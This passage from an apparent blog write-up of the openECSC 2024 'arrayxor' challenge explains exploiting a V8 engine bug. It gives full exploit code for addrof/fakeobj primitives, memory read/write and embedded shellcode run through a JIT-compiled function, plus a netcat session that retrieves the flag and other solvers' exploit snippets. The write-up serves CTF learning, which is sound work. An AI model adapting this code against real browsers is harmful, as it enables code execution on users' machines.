  <span class="jsConKw">return</span> <span class="jsConStr">"0x"</span> + <span class="jsConVar">i</span>.<span class="jsConFun">toString</span>(<span class="jsConValIn">16</span>).<span class="jsConFun">padStart</span>(<span class="jsConValIn">8</span>, <span class="jsConValIn">0</span>);
}
<!---->
<span class="jsConNull">// bigint to 64-bit hex string</span>
<span class="jsConKw">function</span> <span class="jsConIdx">hex64</span>(<span class="jsConIdx">i</span>) {
  <span class="jsConKw">return</span> <span class="jsConStr">"0x"</span> + <span class="jsConVar">i</span>.<span class="jsConFun">toString</span>(<span class="jsConValIn">16</span>).<span class="jsConFun">padStart</span>(<span class="jsConValIn">16</span>, <span class="jsConValIn">0</span>);
}
<!---->
<span class="jsConNull">// set up variables</span>
<span class="jsConKw">const</span> <span class="jsConIdx">arr</span> = [<span class="jsConValIn">1.1</span>, <span class="jsConValIn">2.2</span>, <span class="jsConValIn">3.3</span>];
<span class="jsConKw">const</span> <span class="jsConIdx">tmpObj</span> = {<span class="jsConFun">a</span>: <span class="jsConValIn">1</span>};
<span class="jsConKw">const</span> <span class="jsConIdx">objArr</span> = [<span class="jsConVar">tmpObj</span>];
<!---->
<span class="jsConNull">// nabbed from Popax21</span>
<span class="jsConKw">function</span> <span class="jsConIdx">obj2ptr</span>(<span class="jsConIdx">obj</span>) {
  <span class="jsConKw">var</span> <span class="jsConIdx">arr</span> = [<span class="jsConValIn">13.37</span>];
  <span class="jsConVar">arr</span>.<span class="jsConFun">xor</span>({
    <span class="jsConFun">valueOf</span>: <span class="jsConKw">function</span>() {
      <span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = {}; <span class="jsConNull">//Transition from PACKED_DOUBLE_ELEMENTS to PACKED_ELEMENTS</span>
      <span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">obj</span>;
      <span class="jsConKw">return</span> <span class="jsConValIn">1</span>; <span class="jsConNull">//Clear the lowest bit -&gt; compressed SMI</span>
    } 
  });
  <span class="jsConKw">return</span> (<span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] &lt;&lt; <span class="jsConValIn">1</span>) | <span class="jsConValIn">1</span>;
}
<!---->
<span class="jsConNull">// set up the fake array</span>
<span class="jsConKw">const</span> <span class="jsConIdx">arrAddr</span> = <span class="jsConVar">BigInt</span>(<span class="jsConVar">obj2ptr</span>(<span class="jsConVar">arr</span>));
<span class="jsConKw">const</span> <span class="jsConIdx">arrElementsAddr</span> = <span class="jsConVar">arrAddr</span> - <span class="jsConValIn">0x20n</span>;
<span class="jsConKw">const</span> <span class="jsConIdx">fakeAddr</span> = <span class="jsConVar">arrElementsAddr</span> + <span class="jsConValIn">0x10n</span>;
<span class="jsConKw">const</span> <span class="jsConIdx">fakeElementsAddr</span> = <span class="jsConVar">arrElementsAddr</span> + <span class="jsConValIn">0x8n</span>;
<span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x00000100000008a9n</span>);
<span class="jsConVar">arr</span>[<span class="jsConValIn">1</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x00000725001cb7c5n</span>);
<span class="jsConVar">arr</span>[<span class="jsConValIn">2</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x0000010000000000n</span> + <span class="jsConVar">fakeElementsAddr</span>);
<!---->
<span class="jsConNull">// do the exploit</span>
<span class="jsConKw">const</span> <span class="jsConIdx">tmp</span> = [<span class="jsConValIn">1.1</span>];
<span class="jsConKw">const</span> <span class="jsConIdx">evil</span> = {
  <span class="jsConFun">valueOf</span>: () =&gt; {
    <span class="jsConVar">tmp</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">arr</span>;
    <span class="jsConKw">return</span> <span class="jsConVar">Number</span>(<span class="jsConVar">arrAddr</span> ^ <span class="jsConVar">fakeAddr</span>);
  }
};
<span class="jsConVar">tmp</span>.<span class="jsConFun">xor</span>(<span class="jsConVar">evil</span>);
<!---->
<span class="jsConNull">// this is the fake 128-element array</span>
<span class="jsConKw">const</span> <span class="jsConIdx">oob</span> = <span class="jsConVar">tmp</span>[<span class="jsConValIn">0</span>];
<!---->
<span class="jsConNull">// set up addrof/fakeobj primitives</span>
<span class="jsConKw">function</span> <span class="jsConIdx">addrof</span>(<span class="jsConIdx">o</span>) {
    <span class="jsConVar">objArr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">o</span>;
    <span class="jsConKw">return</span> <span class="jsConVar">f2i</span>(<span class="jsConVar">oob</span>[<span class="jsConValIn">10</span>]) &gt;&gt; <span class="jsConValIn">32n</span>;
}
<!---->
<span class="jsConKw">function</span> <span class="jsConIdx">fakeobj</span>(<span class="jsConIdx">a</span>) {
  <span class="jsConKw">const</span> <span class="jsConIdx">temp</span> = <span class="jsConVar">f2i</span>(<span class="jsConVar">oob</span>[<span class="jsConValIn">10</span>]) &amp; <span class="jsConValIn">0xFFFFFFFFn</span>;
  <span class="jsConVar">oob</span>[<span class="jsConValIn">10</span>] = <span class="jsConVar">i2f</span>(<span class="jsConVar">temp</span> + (<span class="jsConVar">a</span> &lt;&lt; <span class="jsConValIn">32n</span>));
  <span class="jsConKw">return</span> <span class="jsConVar">objArr</span>[<span class="jsConValIn">0</span>];
}
<!---->
<span class="jsConNull">// set up read/write primitives</span>
<span class="jsConKw">function</span> <span class="jsConIdx">read</span>(<span class="jsConIdx">addr</span>) {
  <span class="jsConKw">const</span> <span class="jsConIdx">readArr</span> = [<span class="jsConValIn">1.1</span>, <span class="jsConValIn">2.2</span>];
  <span class="jsConVar">readArr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x00000725001cb7c5n</span>);
  <span class="jsConVar">readArr</span>[<span class="jsConValIn">1</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x0000000200000000n</span> + <span class="jsConVar">addr</span> - <span class="jsConValIn">0x8n</span>);
  <span class="jsConKw">return</span> <span class="jsConVar">f2i</span>(<span class="jsConVar">fakeobj</span>(<span class="jsConVar">addrof</span>(<span class="jsConVar">readArr</span>) - <span class="jsConValIn">0x10n</span>)[<span class="jsConValIn">0</span>]);
}
<!---->
<span class="jsConKw">function</span> <span class="jsConIdx">write</span>(<span class="jsConIdx">addr</span>, <span class="jsConIdx">data</span>) {
  <span class="jsConKw">const</span> <span class="jsConIdx">writeArr</span> = [<span class="jsConValIn">1.1</span>, <span class="jsConValIn">2.2</span>];
  <span class="jsConVar">writeArr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x00000725001cb7c5n</span>);
  <span class="jsConVar">writeArr</span>[<span class="jsConValIn">1</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x0000000200000000n</span> + <span class="jsConVar">addr</span> - <span class="jsConValIn">0x8n</span>);
  <span class="jsConKw">const</span> <span class="jsConIdx">fakeArr</span> = <span class="jsConVar">fakeobj</span>(<span class="jsConVar">addrof</span>(<span class="jsConVar">writeArr</span>) - <span class="jsConValIn">0x10n</span>);
  <span class="jsConVar">fakeArr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">i2f</span>(<span class="jsConVar">data</span>);
}
<!---->
<span class="jsConNull">// set up the shellcode function</span>
<span class="jsConKw">function</span> <span class="jsConIdx">shellcode</span>() {
  <span class="jsConNull">// nabbed from Anvbis</span>
  <span class="jsConKw">return</span> [
    <span class="jsConValIn">1.9711828979523134e-246</span>,
    <span class="jsConValIn">1.9562205631094693e-246</span>,
    <span class="jsConValIn">1.9557819155246427e-246</span>,
    <span class="jsConValIn">1.9711824228871598e-246</span>,
    <span class="jsConValIn">1.971182639857203e-246</span>,
    <span class="jsConValIn">1.9711829003383248e-246</span>,
    <span class="jsConValIn">1.9895153920223886e-246</span>,
    <span class="jsConValIn">1.971182898881177e-246</span>
  ]
}
<!---->
<span class="jsConNull">// turn the shellcode into maglev</span>
<span class="jsConKw">for</span> (<span class="jsConKw">let</span> <span class="jsConIdx">i</span> = <span class="jsConValIn">0</span>; <span class="jsConVar">i</span> &lt; <span class="jsConValIn">10000</span>; <span class="jsConVar">i</span>++) {
  <span class="jsConVar">shellcode</span>();
}
<!---->
<span class="jsConNull">// redirect the function start to our shellcode</span>
<span class="jsConVar">funcAddr</span> = <span class="jsConVar">addrof</span>(<span class="jsConVar">shellcode</span>)
<span class="jsConVar">codeAddr</span> = <span class="jsConVar">read</span>(<span class="jsConVar">funcAddr</span> + <span class="jsConValIn">0x8n</span>) &gt;&gt; <span class="jsConValIn">32n</span>
<span class="jsConVar">instructionStart</span> = <span class="jsConVar">codeAddr</span> + <span class="jsConValIn">0x14n</span>
<span class="jsConVar">write</span>(<span class="jsConVar">instructionStart</span>, <span class="jsConVar">read</span>(<span class="jsConVar">instructionStart</span>) + <span class="jsConValIn">0x7fn</span>);
<span class="jsConVar">shellcode</span>();</div>
</div>

**Let's get the flag!**


<div class="termCode" style="overflow-wrap: anywhere"><span class="termCodeW">$ nc arrayxor.challs.open.ecsc2024.it 38020</span>
Do Hashcash for 24 bits with resource "k2v9WzPBJK2N"
https://pow.cybersecnatlab.it/?data=k2v9WzPBJK2N&bits=24
or
hashcash -mCb24 "k2v9WzPBJK2N"
Result: <span class="termCodeW">1:24:240525:k2v9WzPBJK2N::KmFvCdJ0h09D4MEm:00002QUYY</span>
Send me your js exploit b64-encoded followed by a newline
<span class="termCodeW">Ly8gc2V0IHVwIGhlbHBlciBzdHVmZgpjb25zdCBidWZmZXIgPSBuZXcgQXJyYXl...
cat flag
;</span>
<span class="termCodeFlag">openECSC{t00_e5zy_w1th0ut_s4nb0x_gg_wp_5ec4376e}</span></div>

gg.

## Part 6: What could've been

Since this was my first time doing anything like this I made a few "mistakes" along the way. I think that's really the best way to learn, but I promised to show you a few different ways my exploit could've been significantly improved.

The first thing is something I've already implemented in the final exploit code above - the `obj2ptr` function I nabbed from Popax21's exploit code. Originally, I used `%DebugPrint(arr)` to see the address of the `arr` array on every run to change the code accordingly, but there's a pretty easy way to not have to do that at all!

<div class="jsConsole">
	<div class="jsConCode"><span class="jsConNull">// snippet from Popax21's exploit code</span>
<span class="jsConKw">function</span> <span class="jsConIdx">obj2ptr</span>(<span class="jsConIdx">obj</span>) {
  <span class="jsConKw">var</span> <span class="jsConIdx">arr</span> = [<span class="jsConValIn">13.37</span>];
<!---->
  <span class="jsConVar">arr</span>.<span class="jsConFun">xor</span>({
    <span class="jsConFun">valueOf</span>: <span class="jsConKw">function</span>() {
      <span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = {}; <span class="jsConNull">//Transition from PACKED_DOUBLE_ELEMENTS to PACKED_ELEMENTS</span>
      <span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">obj</span>;
      <span class="jsConKw">return</span> <span class="jsConValIn">1</span>; <span class="jsConNull">//Clear the lowest bit -&gt; compressed SMI</span>
    } 
  });
<!---->
  <span class="jsConKw">return</span> (<span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] &lt;&lt; <span class="jsConValIn">1</span>) | <span class="jsConValIn">1</span>;
}
<!---->
<span class="jsConKw">function</span> <span class="jsConIdx">ptr2obj</span>(<span class="jsConIdx">ptr</span>) {
  <span class="jsConKw">var</span> <span class="jsConIdx">arr</span> = [<span class="jsConValIn">13.37</span>];
<!---->
  <span class="jsConVar">arr</span>.<span class="jsConFun">xor</span>({
    <span class="jsConFun">valueOf</span>: <span class="jsConKw">function</span>() {
      <span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = {}; <span class="jsConNull">//Transition from PACKED_DOUBLE_ELEMENTS to PACKED_ELEMENTS</span>
      <span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = (<span class="jsConVar">ptr</span> &gt;&gt; <span class="jsConValIn">1</span>);
      <span class="jsConKw">return</span> <span class="jsConValIn">1</span>; <span class="jsConNull">//Set the lowest bit -&gt; compressed pointer</span>
    } 
  });
<!---->
  <span class="jsConKw">return</span> <span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>];
}</div>
</div>

Since the difference between a pointer and an SMI is just the last bit, we can put any object or pointer into an array, xor its last bit, and get out the pointer or object accordingly. While I only used those functions in my example exploit code to get the initial address of `arr`, they are pretty much equal to the full **addrof** and **fakeobj** primitives! Beautiful.

Another approach to exploiting the xor I saw in a few solves was changing the length of the array to something small, then forcing a GC to defragment some other object into a region beyond past the array, and then changing the length back to a big amount to get an out-of-bounds read/write. This approach was probably quite brutal to work with, but earned rdjgr their first blood[^6].

<div class="jsConsole">
	<div class="jsConCode"><span class="jsConNull">// snippet from rdjgr's exploit code</span>
<span class="jsConKw">function</span> <span class="jsConIdx">pwn</span>() {
  <span class="jsConKw">let</span> <span class="jsConIdx">num</span> = {};
  <span class="jsConKw">let</span> <span class="jsConIdx">size</span> = <span class="jsConValIn">0x12</span>;
  <span class="jsConKw">let</span> <span class="jsConIdx">num_rets</span> = <span class="jsConValIn">0x10</span>;
  <span class="jsConKw">let</span> <span class="jsConIdx">a</span> = [];
  <span class="jsConKw">for</span> (<span class="jsConKw">let</span> <span class="jsConIdx">i</span> = <span class="jsConValIn">0</span>; <span class="jsConVar">i</span> &lt; <span class="jsConVar">size</span>; <span class="jsConVar">i</span>++) {
    <span class="jsConVar">a</span>.<span class="jsConFun">push</span>(<span class="jsConValIn">1.1</span>);
  }
  <span class="jsConKw">var</span> <span class="jsConIdx">rets</span> = [{<span class="jsConFun">a</span>: <span class="jsConValIn">1.1</span>}];
  <span class="jsConVar">num</span>.<span class="jsConFun">valueOf</span> = <span class="jsConKw">function</span>() {
    <span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"valueof called"</span>);
    <span class="jsConVar">a</span>.<span class="jsConFun">length</span> = <span class="jsConValIn">1</span>;
    <span class="jsConVar">gc</span>();
    <span class="jsConVar">rets</span>.<span class="jsConFun">push</span>({<span class="jsConFun">b</span>: <span class="jsConValIn">1.1</span>});
<!---->
    <span class="jsConKw">return</span> <span class="jsConValIn">0x40</span>;
  };
<!---->
  <span class="jsConVar">a</span>.<span class="jsConFun">xor</span>(<span class="jsConVar">num</span>);
  <span class="jsConVar">rets</span>.<span class="jsConFun">length</span> = <span class="jsConValIn">900</span>
  <span class="jsConKw">return</span> <span class="jsConVar">rets</span>
}</div>
</div>

As for the code execution part, pretty much everyone went for a wasm rwx route instead of going through all the trouble I did to optimize a function into Maglev/Turbocode. [There](https://www.willsroot.io/2021/01/rope2-hackthebox-writeup-chromium-v8.html) [are](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/) [a](https://medium.com/@numencyberlabs/use-wasm-to-bypass-latest-chrome-v8sbx-again-639c4c05b157) [lot](https://jackfromeast.site/2024-01/v8-exploit-revist-oob-v8-starCTF-2019.html) [of](https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/Google2022/exp.js) [write-ups](https://tiszka.com/blog/CVE_2021_21225_exploit.html) for the wasm route, so I felt it'd be more fun to blog about a different approach, and it was the approach I took at the original CTF either way.

In case you're wondering what my original code at the CTF looked like, it was this:

<div class="jsConsole">
	<div class="jsConCode"><details><summary style="cursor:pointer">exploit_final.js</summary><span class="jsConNull">// lyra</span>
<span class="jsConKw">var</span> <span class="jsConIdx">bs</span> = <span class="jsConKw">new</span> <span class="jsConVar">ArrayBuffer</span>(<span class="jsConValIn">8</span>);
<span class="jsConKw">var</span> <span class="jsConIdx">fs</span> = <span class="jsConKw">new</span> <span class="jsConVar">Float64Array</span>(<span class="jsConVar">bs</span>);
<span class="jsConKw">var</span> <span class="jsConIdx">is</span> = <span class="jsConKw">new</span> <span class="jsConVar">BigUint64Array</span>(<span class="jsConVar">bs</span>);
<!---->
<span class="jsConKw">function</span> <span class="jsConIdx">ftoi</span>(<span class="jsConIdx">x</span>) {
  <span class="jsConVar">fs</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">x</span>;
  <span class="jsConKw">return</span> <span class="jsConVar">is</span>[<span class="jsConValIn">0</span>];
}
<!---->
<span class="jsConKw">function</span> <span class="jsConIdx">itof</span>(<span class="jsConIdx">x</span>) {
  <span class="jsConVar">is</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">x</span>;
  <span class="jsConKw">return</span> <span class="jsConVar">fs</span>[<span class="jsConValIn">0</span>];
}
<!---->
<!---->
<!---->
<span class="jsConKw">const</span> <span class="jsConIdx">foo</span> = (() =&gt; {
<span class="jsConKw">const</span> <span class="jsConIdx">f</span> = () =&gt; {
  <span class="jsConKw">return</span> [
<span class="jsConValIn">1.9711828979523134e-246</span>,
<span class="jsConValIn">1.9562205631094693e-246</span>,
<span class="jsConValIn">1.9557819155246427e-246</span>,
<span class="jsConValIn">1.9711824228871598e-246</span>,
<span class="jsConValIn">1.971182639857203e-246</span>,
<span class="jsConValIn">1.9711829003383248e-246</span>,
<span class="jsConValIn">1.9895153920223886e-246</span>,
<span class="jsConValIn">1.971182898881177e-246</span>,
  ];
}
<span class="jsConNull">//%PrepareFunctionForOptimization(f);</span>
<span class="jsConVar">f</span>();
<span class="jsConNull">//%OptimizeFunctionOnNextCall(f);</span>
<span class="jsConKw">for</span> (<span class="jsConKw">var</span> <span class="jsConIdx">i</span> = <span class="jsConValIn">0</span>; <span class="jsConVar">i</span> &lt; <span class="jsConValIn">100000</span>; <span class="jsConVar">i</span>++) { <span class="jsConVar">f</span>() }
<span class="jsConVar">f</span>()
<span class="jsConKw">return</span> <span class="jsConVar">f</span>;
})();
<!---->
<span class="jsConKw">var</span> <span class="jsConIdx">a</span> = [];
<span class="jsConKw">for</span> (<span class="jsConKw">var</span> <span class="jsConIdx">i</span> = <span class="jsConValIn">0</span>; <span class="jsConVar">i</span> &lt; <span class="jsConValIn">100000</span>; <span class="jsConVar">i</span>++) { <span class="jsConVar">a</span>[<span class="jsConVar">i</span>] = <span class="jsConKw">new</span> <span class="jsConVar">String</span>(<span class="jsConStr">""</span>);<span class="jsConVar">foo</span>(); }
<span class="jsConKw">new</span> <span class="jsConVar">ArrayBuffer</span>(<span class="jsConValIn">0x80000000</span>);
<!---->
<span class="jsConKw">var</span> <span class="jsConIdx">arr1</span> = [<span class="jsConValIn">5.432309235825e-312</span>, <span class="jsConValIn">1337.888</span>, <span class="jsConValIn">3.881131231533e-311</span>, <span class="jsConValIn">5.432329947926e-312</span>];
<span class="jsConKw">var</span> <span class="jsConIdx">flt</span> = [<span class="jsConValIn">1.1</span>];
<span class="jsConKw">var</span> <span class="jsConIdx">tmp</span> = {<span class="jsConFun">a</span>: <span class="jsConValIn">1</span>};
<span class="jsConKw">var</span> <span class="jsConIdx">obj</span> = [<span class="jsConVar">tmp</span>];
<span class="jsConKw">var</span> <span class="jsConIdx">array</span> = [-<span class="jsConValIn">0</span>];
<span class="jsConKw">var</span> <span class="jsConIdx">hasRun</span> = <span class="jsConValIn">false</span>;
<!---->
<span class="jsConNull">//%DebugPrint(arr1);</span>
<span class="jsConNull">//%DebugPrint(flt);</span>
<span class="jsConNull">//%DebugPrint(obj);</span>
<!---->
<span class="jsConKw">function</span> <span class="jsConIdx">getHandler</span>() {
  <span class="jsConKw">if</span> (<span class="jsConVar">hasRun</span>) <span class="jsConKw">return</span>;
  <span class="jsConVar">hasRun</span> = <span class="jsConValIn">true</span>;
  <span class="jsConVar">array</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">arr1</span>;
  <span class="jsConKw">return</span> <span class="jsConValIn">80</span>;
}
<!---->
<span class="jsConVar">x</span> = []
<span class="jsConVar">x</span>.<span class="jsConFun">__defineGetter__</span>(<span class="jsConStr">"0"</span>, <span class="jsConVar">getHandler</span>);
<!---->
<span class="jsConVar">array</span>.<span class="jsConFun">xor</span>(<span class="jsConVar">x</span>);
<!---->
<span class="jsConNull">//%DebugPrint(arr1);</span>
<!---->
<span class="jsConNull">//%SystemBreak();</span>
<!---->
<span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"s1"</span>);
<!---->
<span class="jsConKw">const</span> <span class="jsConIdx">oob</span> = <span class="jsConVar">array</span>[<span class="jsConValIn">0</span>];
<!---->
<span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"s2"</span>);
<!---->
<!---->
<!---->
<span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"s3"</span>);
<!---->
<span class="jsConKw">function</span> <span class="jsConIdx">addrof</span>(<span class="jsConIdx">o</span>) {
  <span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"oob = oob"</span>);
  <span class="jsConVar">oob</span>[<span class="jsConValIn">6</span>] = <span class="jsConVar">oob</span>[<span class="jsConValIn">18</span>]; 
  <span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"obj[0] = o"</span>);
  <span class="jsConVar">obj</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">o</span>;
  <span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"ret"</span>);
  <span class="jsConKw">return</span> (<span class="jsConVar">ftoi</span>(<span class="jsConVar">flt</span>[<span class="jsConValIn">0</span>]) &amp; <span class="jsConValIn">0xffffffffn</span>) - <span class="jsConValIn">1n</span>;
}
<!---->
<span class="jsConKw">function</span> <span class="jsConIdx">read</span>(<span class="jsConIdx">p</span>) {
  <span class="jsConKw">let</span> <span class="jsConIdx">a</span> = <span class="jsConVar">ftoi</span>(<span class="jsConVar">oob</span>[<span class="jsConValIn">6</span>]) &gt;&gt; <span class="jsConValIn">32n</span>;
  <span class="jsConVar">oob</span>[<span class="jsConValIn">6</span>] = <span class="jsConVar">itof</span>((<span class="jsConVar">a</span> &lt;&lt; <span class="jsConValIn">32n</span>) + <span class="jsConVar">p</span> - <span class="jsConValIn">8n</span> + <span class="jsConValIn">1n</span>);
  <span class="jsConKw">return</span> <span class="jsConVar">ftoi</span>(<span class="jsConVar">flt</span>[<span class="jsConValIn">0</span>]);
}
<!---->
<span class="jsConKw">function</span> <span class="jsConIdx">write</span>(<span class="jsConIdx">p</span>, <span class="jsConIdx">x</span>) {
  <span class="jsConKw">let</span> <span class="jsConIdx">a</span> = <span class="jsConVar">ftoi</span>(<span class="jsConVar">oob</span>[<span class="jsConValIn">6</span>]) &gt;&gt; <span class="jsConValIn">32n</span>;
  <span class="jsConVar">oob</span>[<span class="jsConValIn">6</span>] = <span class="jsConVar">itof</span>((<span class="jsConVar">a</span> &lt;&lt; <span class="jsConValIn">32n</span>) + <span class="jsConVar">p</span> - <span class="jsConValIn">8n</span> + <span class="jsConValIn">1n</span>);
  <span class="jsConVar">flt</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">itof</span>(<span class="jsConVar">x</span>);
}
<!---->
<span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"s3.5"</span>);
<!---->
<span class="jsConKw">let</span> <span class="jsConIdx">foo_addr</span> = <span class="jsConVar">addrof</span>(<span class="jsConVar">foo</span>);
<span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConVar">foo_addr</span>);
<span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConVar">oob</span>[<span class="jsConValIn">0</span>]);
<!---->
<!---->
<!---->
<span class="jsConVar">foo_addr</span> = <span class="jsConVar">addrof</span>(<span class="jsConVar">foo</span>);
<span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"foo_addr:"</span>, <span class="jsConVar">foo_addr</span>);
<!---->
<span class="jsConKw">let</span> <span class="jsConIdx">code</span> = (<span class="jsConVar">read</span>(<span class="jsConVar">foo_addr</span> + <span class="jsConValIn">0x08n</span>) - <span class="jsConValIn">1n</span>) &gt;&gt; <span class="jsConValIn">32n</span>;
<span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"code:"</span>, <span class="jsConVar">code</span>);
<!---->
<span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"0x00:"</span>, <span class="jsConVar">read</span>(<span class="jsConVar">foo_addr</span> + <span class="jsConValIn">0x00n</span>));
<span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"0x10:"</span>, <span class="jsConVar">read</span>(<span class="jsConVar">foo_addr</span> + <span class="jsConValIn">0x10n</span>));
<!---->
<span class="jsConKw">let</span> <span class="jsConIdx">entry</span> = <span class="jsConVar">read</span>(<span class="jsConVar">code</span> - <span class="jsConValIn">0x100n</span> + <span class="jsConValIn">0x113n</span>);
<span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"entry:"</span>, <span class="jsConVar">entry</span>);
<!---->
<span class="jsConVar">write</span>(<span class="jsConVar">code</span> - <span class="jsConValIn">0x100n</span> + <span class="jsConValIn">0x113n</span>, <span class="jsConVar">entry</span> + <span class="jsConValIn">0x53n</span>);
<span class="jsConVar">entry</span> = <span class="jsConVar">read</span>(<span class="jsConVar">code</span> - <span class="jsConValIn">0x100n</span> + <span class="jsConValIn">0x113n</span>);
<!---->
<span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"entry:"</span>, <span class="jsConVar">entry</span>);
<!---->
<span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"launching"</span>);
<span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConVar">tmp</span>);
<!---->
<span class="jsConVar">foo</span>();</details></div>
</div>

Not as pretty as the one I made for the blog, but hey, I got the flag, and secured a place in the top 10 of the overall competition!

## Part 7: Afterword

thank you so much for checking out my writeup!!

quite the blogpost, isn't it! i've never actually done this kind of pwn before, and i think i learned a lot, so i wanted to pass it forward and share it with you all!

i worked really hard on making all of the html/css on this page be as helpful, interactive, and pretty as possible. as with my last post, everything here is html/css handcrafted with love - no images or javascript were used and it's all just 30kB<!-- todo change this number --> gzipped. oh and everything's responsive too so it should look great no matter if you're on a small phone or a big hidpi screen! try resizing your window and see how different parts of the post react to it.

this post should work cross-browser, but the v8/gdb hover highlight things and the little endian widget don't work in the current version of ladybird because it doesn't support the `:has()` selector and resizable handles, hopefully it'll get those too at some point!

**Discuss this post on:** twitter, mastodon, hackernews, cohost

<style>
.jsMem {
	color: #DCDFE4;
	background: #282C34;
	border-radius: 4px;
	padding:8px;
	cursor: default;
}

.coarseText {
	display: none;
}
.fineText {
	display: inline;
}

/*
 *	Disable text selection on touchscreens because you can't
 *  hover over the interactive elements and tapping them will
 *  try to select the text if we don't disable selections.
 */
@media (pointer: coarse) {
	.jsMem {
		user-select: none;
	}
	.coarseText {
		display: inline;
	}
	.fineText {
		display: none;
	}
}

.jsMemTitle {
	pointer-events: none;
	user-select: none;
	color: var(--lyreGold);
	font-family: Menlo, Consolas, "Ubuntu Mono", monospace;
	font-size: 14px;
	display: flex;
	margin: 4px 4px 4px;
}
.jsMemSep {
	margin-left: 5px;
	margin-top: 1px;
	flex-grow: 1;
	align-self: center;
	display: inline-block;
	height: 2px;
	background: var(--lyreGold);
}

.jsMem *::selection {
	background: #00F;
	color: #FFF;
}

.jsMemDbg {
	font-size: 12px;
	white-space: pre-wrap;
	font-family: Menlo, Consolas, "Ubuntu Mono", monospace;
}

.jsMemHex {
	font-size: 12px;
	white-space: pre-wrap;
	font-family: Menlo, Consolas, "Ubuntu Mono", monospace;
}

.jsMemLegend span {
	/* text-decoration: underline wavy; */
}

:root {
	--lyreGold: #FAD542;
	--jsMemVarB0:  #0000;
	--jsMemVarB1:  #0000;
	--jsMemVarB2:  #0000;
	--jsMemVarB3:  #0000;
	--jsMemVarB4:  #0000;
	--jsMemVarB5:  #0000;
	--jsMemVarB6:  #0000;
	--jsMemVarB7:  #0000;
	--jsMemVarB8:  #0000;
	--jsMemVarB9:  #0000;
	--jsMemVarB10:  #0000;
	--jsMemVarB11:  #0000;
	--jsMemVarB12:  #0000;
	--jsMemVarB13:  #0000;
	--jsMemVarB14:  #0000;
	--jsMemVarB15:  #0000;
	--jsMemVarB16:  #0000;
	--jsMemVarB17:  #0000;
	--jsMemVarB18:  #0000;
	--jsMemVarB19:  #0000;
	--jsMemVarB20:  #0000;
	--jsMemVarB21:  #0000;
	--jsMemVarF0:  #ff9999;
	--jsMemVarF1:  #ffc199;
	--jsMemVarF2:  #ffea99;
	--jsMemVarF3:  #eaff99;
	--jsMemVarF4:  #c1ff99;
	--jsMemVarF5:  #99ff99;
	--jsMemVarF6:  #99ffc1;
	--jsMemVarF7:  #99ffea;
	--jsMemVarF8:  #99eaff;
	--jsMemVarF9:  #99c1ff;
	--jsMemVarF10:  #9999ff;
	--jsMemVarF11:  #c199ff;
	--jsMemVarF12:  #ea99ff;
	--jsMemVarF13:  #ff99ea;
	--jsMemVarF14:  #ff99c1;
	--jsMemVarF15:  #ff9999;
	--jsMemVarF16:  #ffc199;
	--jsMemVarF17:  #ffea99;
	--jsMemVarF18:  #eaff99;
	--jsMemVarF19:  #c1ff99;
	--jsMemVarF20:  #99ff99;
	--jsMemVarF21:  #99ffc1;
	--jsMemVarB: var(--lyreGold);
	--jsMemVarF: #000;
}

.jsMemVar0 { color: var(--jsMemVarF0); background: var(--jsMemVarB0) }
.jsMemVar1 { color: var(--jsMemVarF1); background: var(--jsMemVarB1) }
.jsMemVar2 { color: var(--jsMemVarF2); background: var(--jsMemVarB2) }
.jsMemVar3 { color: var(--jsMemVarF3); background: var(--jsMemVarB3) }
.jsMemVar4 { color: var(--jsMemVarF4); background: var(--jsMemVarB4) }
.jsMemVar5 { color: var(--jsMemVarF5); background: var(--jsMemVarB5) }
.jsMemVar6 { color: var(--jsMemVarF6); background: var(--jsMemVarB6) }
.jsMemVar7 { color: var(--jsMemVarF7); background: var(--jsMemVarB7) }
